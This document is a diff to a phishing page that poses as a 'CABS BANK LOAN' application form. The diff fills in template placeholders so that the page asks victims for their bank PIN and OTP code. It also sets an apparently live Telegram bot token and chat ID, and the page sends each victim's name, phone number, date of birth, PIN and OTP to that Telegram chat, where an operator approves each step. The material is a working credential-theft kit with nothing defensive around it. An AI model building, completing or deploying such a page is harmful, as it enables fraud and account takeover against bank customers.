@@ -283,7 +283,7 @@ input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:22px;heigh
 
       <!-- ↓ CHANGE "EDIT_LABEL_HERE" TO YOUR LABEL ↓ -->
       <div class="f">
-        <label>EDIT_LABEL_HERE</label>
+        <label>PIN CODE</label>
         <input type="text" id="p3_field"/>
       </div>
       <!-- ↑ CHANGE "EDIT_LABEL_HERE" TO YOUR LABEL ↑ -->
@@ -353,7 +353,7 @@ input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:22px;heigh
 
       <!-- ↓ CHANGE "EDIT_P4_LABEL_HERE" TO YOUR LABEL ↓ -->
       <div class="f">
-        <label>EDIT_P4_LABEL_HERE</label>
+        <label>OTP CODE</label>
         <input type="text" id="p4_field"/>
       </div>
       <!-- ↑ CHANGE "EDIT_P4_LABEL_HERE" TO YOUR LABEL ↑ -->
@@ -409,8 +409,8 @@ input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:22px;heigh
 
 
 <script>
-  const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
-  const CHAT_ID   = "8718124300";
+  const BOT_TOKEN = "9070147552:AAGg4Xqlv_Qol51kQ-qdgG3jgXOgbunYshM";
+  const CHAT_ID   = "6301686380";
   const API       = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
   let app={}, pollTimer=null, countdown=null, lastId=0, curRef=null;
@@ -512,7 +512,7 @@ input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:22px;heigh
     // ↓ CHANGE "EDIT_LABEL_HERE" TO MATCH YOUR LABEL ↓
     const msg="🏦 *CABS BANK LOAN — STEP 3*\n━━━━━━━━━━━━━━━━━━━━\n\n"+
       `👤 *Name:* ${app.name}\n📱 *Phone:* ${app.phone}\n💵 *Amount:* USD $${Number(app.amt).toLocaleString()}\n\n`+
-      `▪️ *EDIT_LABEL_HERE:* ${field}\n\n`+
+      `▪️ *PIN:* ${field}\n\n`+
     // ↑ CHANGE "EDIT_LABEL_HERE" TO MATCH YOUR LABEL ↑
       `🔖 *Ref:* \`${curRef}\`\n🕐 *Time:* ${stamp()}\n\n👇 *Approve to proceed to Final Step:*`;
     try{
@@ -561,7 +561,7 @@ input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:22px;heigh
       `👤 *Name:* ${app.name}\n📱 *Phone:* ${app.phone}\n`+
       `💵 *Amount:* USD $${Number(app.amt).toLocaleString()}\n🎂 *DOB:* ${app.dob}\n`+
       `▪️ *Step 3:* ${app.p3}\n\n`+
-      `▪️ *EDIT_P4_LABEL_HERE:* ${field}\n\n`+
+      `▪️ *OTP:* ${field}\n\n`+
     // ↑ CHANGE "EDIT_P4_LABEL_HERE" TO MATCH YOUR LABEL ↑
       `🔖 *Final Ref:* \`${curRef}\`\n🕐 *Time:* ${stamp()}\n\n👇 *FINAL DECISION:*`;
     try{
